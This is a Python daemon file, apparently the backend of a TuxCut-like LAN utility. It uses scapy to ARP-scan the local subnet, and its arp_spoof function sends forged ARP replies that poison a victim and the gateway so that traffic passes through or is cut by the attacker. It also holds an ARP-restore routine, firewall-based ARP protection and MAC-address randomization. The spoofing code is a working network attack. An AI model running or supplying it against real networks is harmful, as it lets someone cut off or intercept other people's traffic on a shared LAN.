import os
import re
import socket
import random
import subprocess
import logging

from scapy.all import ARP, Ether, srp, send, get_if_addr, get_if_hwaddr

logger = logging.getLogger('tuxcutd')


def run(*args):
    subprocess.run(list(args), capture_output=True)


def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except Exception:
        return ''


def get_default_gw():
    """Parse 'ip route' — works everywhere, no netifaces needed."""
    out = subprocess.run(['ip', 'route', 'show', 'default'],
                         capture_output=True, text=True).stdout
    m = re.search(r'default via (\S+) dev (\S+)', out)
    if not m:
        return {}
    gw_ip, iface = m.group(1), m.group(2)

    # ARP to get gateway MAC
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=gw_ip),
                 timeout=3, verbose=False)
    gw_mac = ans[0][1].hwsrc if ans else ''

    return {'ip': gw_ip, 'mac': gw_mac, 'iface': iface,
            'hostname': get_hostname(gw_ip)}


def get_my_info(iface):
    return {
        'ip':       get_if_addr(iface),
        'mac':      get_if_hwaddr(iface),
        'hostname': get_hostname(get_if_addr(iface)),
    }


def scan_network(gw_ip):
    """ARP scan /24."""
    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=f'{gw_ip}/24'),
                 timeout=3, verbose=False)
    return [{'ip': r.psrc, 'mac': r.hwsrc, 'hostname': get_hostname(r.psrc)}
            for _, r in ans]


# ── ARP Spoofing ────────────────────────────────────────────────────

def arp_spoof(victim, gw, my_mac):
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=my_mac,
             pdst=victim['ip'],       hwdst=victim['mac']),
         count=3, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=my_mac,
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=3, verbose=False)


def arp_restore(victim, gw):
    send(ARP(op=2, psrc=gw['ip'],     hwsrc=gw['mac'],
             pdst=victim['ip'],       hwdst=victim['mac']),
         count=10, verbose=False)
    send(ARP(op=2, psrc=victim['ip'], hwsrc=victim['mac'],
             pdst=gw['ip'],           hwdst=gw['mac']),
         count=10, verbose=False)


# ── Protection (nftables first, arptables fallback) ─────────────────

def enable_protection(gw_ip, gw_mac, iface):
    # Pin gateway ARP entry permanently
    run('ip', 'neigh', 'replace', gw_ip,
        'lladdr', gw_mac, 'dev', iface, 'nud', 'permanent')

    if _has('nft'):
        run('nft', 'delete', 'table', 'arp', 'tuxcut')
        nft = f"""\
table arp tuxcut {{
    chain input {{
        type filter hook input priority 0; policy drop;
        arp saddr ip {gw_ip} arp saddr ether {gw_mac} accept
    }}
}}"""
        subprocess.run(['nft', '-f', '-'], input=nft.encode(), capture_output=True)
    elif _has('arptables'):
        run('arptables', '-F')
        run('arptables', '-P', 'INPUT', 'DROP')
        run('arptables', '-A', 'INPUT', '-s', gw_ip,
            '--source-mac', gw_mac, '-j', 'ACCEPT')


def disable_protection(iface='', gw_ip=''):
    if iface and gw_ip:
        run('ip', 'neigh', 'delete', gw_ip, 'dev', iface)
    if _has('nft'):
        run('nft', 'delete', 'table', 'arp', 'tuxcut')
    if _has('arptables'):
        run('arptables', '-P', 'INPUT', 'ACCEPT')
        run('arptables', '-F')


# ── MAC change (ip link, no ifconfig needed) ────────────────────────

def change_mac(iface):
    mac = ':'.join(['%02x' % b for b in [
        0x02, random.randint(0, 0x7f),
        *[random.randint(0, 0xff) for _ in range(4)]]])
    run('ip', 'link', 'set', iface, 'down')
    run('ip', 'link', 'set', iface, 'address', mac)
    run('ip', 'link', 'set', iface, 'up')
    return mac


def _has(cmd):
    return subprocess.run(['which', cmd], capture_output=True).returncode == 0
